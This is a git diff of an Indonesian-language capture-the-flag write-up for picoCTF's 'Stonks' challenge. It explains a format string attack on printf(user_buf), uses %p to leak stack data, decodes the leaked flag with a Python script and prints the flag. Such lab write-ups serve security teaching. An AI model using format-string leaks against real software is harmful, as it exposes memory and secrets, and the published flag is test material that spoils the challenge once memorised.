@@ -1,6 +1,8 @@
  nc mercury.picoctf.net 16439
+ 
+ solve dengan cara format strings attack
 
-'''
+```
 int buy_stonks(Portfolio *p) {
 	if (!p) {
 		return 1;
@@ -25,21 +27,21 @@ int buy_stonks(Portfolio *p) {
 		money -= shares;
 	}
 	printf("Stonks chosen\n");
-'''
+```
 
-'''
+```
 char *user_buf = malloc(300 + 1);
 printf("What is your API token?\n");
 scanf("%300s", user_buf);
 printf("Buying stonks with token:\n");
 printf(user_buf);
-'''
+```
 
-disini terlihat '''printf(user_buf);''' adalah format string merupakan data yang dapat di kontrol 
+disini terlihat ```printf(user_buf);``` adalah format string merupakan data yang dapat di kontrol 
 
 di awal terlihat buy_stonks(), saya melihat melihat apa yang tampak seperti file flag sedang dimuat dan isinya sedang disalin ke buffer di tumpukan:
 
-'''
+```
 char api_buf[FLAG_BUFFER];
 FILE *f = fopen("api","r");
 if (!f) {
@@ -47,12 +49,12 @@ if (!f) {
     exit(1);
 }
 fgets(api_buf, FLAG_BUFFER, f);
-'''
+```
 
 jadi pada tumpukan itu, dapat diketahui bahwa printf() akan menarik data dari tumpukan secara berurutan untuk mencocokkan setiap penentu format dalam string format yang disediakan.
-karna mengetahui ini adalah format strings attack saya menggunakan '''%p''' 
+karna mengetahui ini adalah format strings attack saya menggunakan ```%p``` 
 
-'''
+```
 What would you like to do?
 1) Buy some stonks!
 2) View my portfolio
@@ -78,12 +80,12 @@ Portfolio as of Wed Jan 25 14:45:07 UTC 2023
 283 shares of VXE
 1006 shares of S
 Goodbye!
-'''
+```
 
 lalu terliat banyak bilangan hex dan saya langsung convert ke ascii, setelah di decode saya melihat flag aneh yang ternyata integers little endian
 setelah itu saya mendecode little endian menggunakan python
 
-'''
+```
 string = "ocip{FTC0l_I4_t5m_ll0m_y_y3n4cdbae52ÿ½�}"
 out = ""
 temp = ""
@@ -98,7 +100,7 @@ for char in string:
         out += fwd
         temp = ""
 print(out)
-'''
+```
 
 picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}�½ÿ
 
